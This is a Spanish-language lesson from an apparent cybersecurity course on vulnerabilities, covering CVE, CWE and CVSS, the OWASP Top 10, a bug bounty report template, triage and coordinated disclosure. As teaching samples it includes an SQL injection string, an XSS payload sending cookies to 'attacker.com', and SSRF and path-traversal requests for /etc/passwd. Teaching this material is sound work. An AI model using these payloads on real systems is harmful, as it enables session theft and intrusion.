---
title: "06 — Vulnerabilidades: qué son, cómo se encuentran y se clasifican"
---

# 06 — Vulnerabilidades: qué son, cómo se encuentran y se clasifican

> 🎯 **Objetivo:** entender el lenguaje de las vulnerabilidades: CVE, CVSS, CWE, OWASP. Saber leer un reporte y triagearlo.

## 1. ¿Qué es una vulnerabilidad?

Una **vulnerabilidad** es una debilidad en un sistema que un atacante puede explotar.

**Tres ingredientes para que haya problema:**
1. Una debilidad (bug en código, mala configuración, defecto de diseño).
2. Un atacante que la conoce.
3. Un activo que la organización quiere proteger.

Si falta cualquiera de los tres, no hay riesgo real (o el riesgo es despreciable).

## 2. Cómo se descubre una vulnerabilidad

- 🔬 **Investigación interna** — un equipo de seguridad audita el código.
- 🐛 **Reporte externo** — un investigador ético o un bug bounty hunter.
- 📢 **Divulgación pública** — alguien publica y la comunidad reacciona (a veces con miedo, a veces con calma).
- 🤖 **Fuzzers** — herramientas que meten inputs aleatorios y ven qué crashea.
- 🕵️ **Mercado negro** — actores maliciosos las venden (no confundir con bug bounty).
- ⛏️ **Minería en código abierto** — bots automatizados escanean GitHub 24/7.

## 3. Taxonomía: CVE, CWE, CVSS

### CVE (la "matrícula" de la vulnerabilidad)

- **CVE-AAAA-NNNN** — ID único asignado por MITRE.
- Ej: `CVE-2017-0144` (EternalBlue, la que usó WannaCry).
- Cada CVE tiene una descripción corta y referencias.

### CWE (la "familia" del problema)

- Categoría de debilidad (la "raíz" del problema).
- Ejemplos:
  - **CWE-79** — Cross-site Scripting (XSS)
  - **CWE-89** — SQL Injection
  - **CWE-22** — Path Traversal
  - **CWE-798** — Hardcoded credentials
  - **CWE-200** — Information Exposure

### CVSS (la "gravedad")

- Sistema 0–10. Versión actual: **CVSS 3.1**.
- Combina métricas: vector de ataque, complejidad, privilegios requeridos, interacción de usuario, impacto (C/I/A).
- Categorías: `None (0.0) / Low (0.1-3.9) / Medium (4.0-6.9) / High (7.0-8.9) / Critical (9.0-10.0)`.
- Ej: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → 9.8 (crítico, red, sin interacción).

## 4. OWASP Top 10 (web)

El **OWASP Top 10** lista las 10 categorías de riesgo web más comunes (edición 2021):

1. **A01 — Broken Access Control** — el clásico: un usuario hace cosas que no debería.
2. **A02 — Cryptographic Failures** — datos sensibles sin cifrar, mal hashing, HTTP en vez de HTTPS.
3. **A03 — Injection** — SQLi, NoSQLi, LDAPi, command injection.
4. **A04 — Insecure Design** — fallas de diseño, no de código.
5. **A05 — Security Misconfiguration** — defaults inseguros, paneles admin abiertos, errores verbosos.
6. **A06 — Vulnerable & Outdated Components** — dependencias sin parchear.
7. **A07 — Identification & Authentication Failures** — login roto, contraseñas débiles, falta de MFA.
8. **A08 — Software & Data Integrity Failures** — actualizaciones sin verificar, CI/CD inseguro.
9. **A09 — Security Logging & Monitoring Failures** — ataques que nadie ve.
10. **A10 — Server-Side Request Forgery (SSRF)** — el servidor hace peticiones internas a tu nombre.

> 📂 Profundiza en cada categoría con labs en [`02-pentesting-red-team/`](../02-pentesting-red-team/) y [`01-CIBERSEGURIDAD/seguridad-aplicaciones/`](../01-CIBERSEGURIDAD/seguridad-aplicaciones/).

## 5. Vulnerabilidades comunes que verás 1000 veces

### 5.1 SQL Injection (SQLi)

```sql
SELECT * FROM users WHERE username='admin' AND password='lo_que_meta';
```

Si input es `' OR '1'='1`, la consulta se vuelve:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1';
```
→ loguea como admin sin conocer la contraseña.

**Mitigación:** consultas preparadas, ORM, menos privilegios al usuario de DB.

### 5.2 XSS (Cross-Site Scripting)

```html
<!-- Input -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

Si la web lo refleja sin sanitizar, el navegador ejecuta el JS y roba cookies.

**Variantes:** stored, reflected, DOM-based.
**Mitigación:** escapar output, CSP headers, sanitización.

### 5.3 SSRF

```http
GET /api/fetch?url=http://localhost:8080/admin
```

Si la app hace fetch a lo que el usuario le pasa, puede leer servicios internos.

### 5.4 IDOR

```http
GET /api/users/123/profile   # yo soy el 123
GET /api/users/124/profile   # veamos el de otro sin permiso
```

**IDOR = Insecure Direct Object Reference.** Falla de control de acceso.

### 5.5 Path Traversal

```http
GET /download?file=../../../../etc/passwd
```

### 5.6 Hardcoded secrets

```python
# 😱
API_KEY = "sk-1234567890abcdef"
```

> Bots escanean GitHub 24/7 y avisan al atacante en minutos.

## 6. Bug Bounty — reporte profesional

Si reportas a un bug bounty, espera algo así:

```
# Title
Stored XSS in profile name field via SVG upload

## Severity
High (CVSS 7.4)

## Description
When uploading a profile image in SVG format, the server does
not sanitize <script> tags inside the SVG XML namespace...

## Steps to Reproduce
1. Create a profile image in SVG that includes <script>alert(1)</script>
2. Upload as profile picture
3. View another user's profile page that renders my picture
4. XSS fires in their session

## Impact
Attacker can hijack any user's session, exfiltrate cookies,
perform actions on behalf of the user.

## Suggested Fix
- Serve all user uploads from a separate domain with no cookies
- Or convert SVG to a safe raster format on upload
- Add Content-Security-Policy header

## Evidence
[Attach screenshots / video / HTTP request-response]
```

> 📂 Ejemplo de template en [`02-pentesting-red-team/portafolio/`](../02-pentesting-red-team/portafolio/).

## 7. Triage — qué arreglo primero

P0 — Caer producción, fuga de datos masiva
P1 — Crítico explotable ya en producción
P2 — Medio, explotable con interacción o condiciones
P3 — Bajo, informativo, hardening

```
Riesgo = (Probabilidad de explotación) × (Impacto)
Considera: ¿está expuesto a internet? ¿hay exploit público? ¿afecta datos sensibles?
```

## 8. Cómo NO reportar una vulnerabilidad

❌ No publiques un 0-day sin avisar al fabricante primero (divulgación coordinada).
❌ No la pruebes en producción sin permiso.
❌ No la uses para beneficio propio.
✅ Coordina, espera el parche, después publica con crédito.

## 📌 Dónde practicar

| Recurso | Dónde |
|---|---|
| OWASP labs | [OWASP WebGoat](https://owasp.org/www-project-webgoat/), [DVWA](http://www.dvwa.co.uk/) |
| HackTheBox / TryHackMe | [`04-LABORATORIOS/htb-thm/`](../04-LABORATORIOS/htb-thm/) |
| Labs propios | [`04-LABORATORIOS/labs-propios/`](../04-LABORATORIOS/labs-propios/) |
| Writeups | [`04-LABORATORIOS/ctf-writeups/`](../04-LABORATORIOS/ctf-writeups/) |
| Análisis de vulnerabilidades | [`01-CIBERSEGURIDAD/03-analisis-vulnerabilidades/`](../01-CIBERSEGURIDAD/03-analisis-vulnerabilidades/) |
| Bug bounty hunting | [`01-CIBERSEGURIDAD/bug-bounty-hunting/`](../01-CIBERSEGURIDAD/bug-bounty-hunting/) |

## ✏️ Ejercicios

1. **Busca un CVE nuevo:** entra a [cve.mitre.org](https://cve.mitre.org/) o [nvd.nist.gov](https://nvd.nist.gov/) y encuentra un CVE de la última semana. Lee la descripción y clasifica por OWASP.
2. **OWASP WebGoat:** corre WebGoat localmente (`docker run -p 8080:8080 webgoat/webgoat`) y resuelve 3 lecciones.
3. **CVSS Calculator:** entra a [first.org/cvss/calculator/3.1](https://www.first.org/cvss/calculator/3.1) y experimenta hasta que entiendas qué cambia cada métrica.
4. **CVEs recientes en tu stack:** si usas WordPress, busca CVEs de plugins que tengas instalados.

> ⏭️ **Siguiente:** [`07-etica-y-leyes.md`](./07-etica-y-leyes.md) — los límites que todo profesional debe respetar.
